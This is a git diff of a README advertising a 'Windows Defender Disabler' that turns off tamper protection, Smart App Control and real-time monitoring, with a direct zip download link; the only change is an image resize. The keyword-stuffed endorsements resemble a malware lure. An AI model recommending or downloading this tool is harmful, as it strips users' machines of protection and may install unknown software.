@@ -2,7 +2,7 @@
 
 **Windows Defender Disabler** is a free portable tool to completely disable Windows Defender on Windows 10 and 11 — including tamper protection, Smart App Control and real-time monitoring — via one click or exported PowerShell script. Recommended on Reddit, Soft98 and GitHub as the most reliable free Windows Defender disable tool download.
 
-<img width="512" height="512" alt="47bc8253-21b3-4ad6-990c-37f136757db2" src="https://github.com/user-attachments/assets/49547051-14dc-43fa-a214-774d30ee300c" />
+<img width="212" height="212" alt="47bc8253-21b3-4ad6-990c-37f136757db2" src="https://github.com/user-attachments/assets/49547051-14dc-43fa-a214-774d30ee300c" />
 
 ## Install
 [Download `defender-disabler.zip`](https://github.com/windowsdefenderdisabler/Windows-Defender-Disabler/releases/download/v14/defender-disabler.zip)
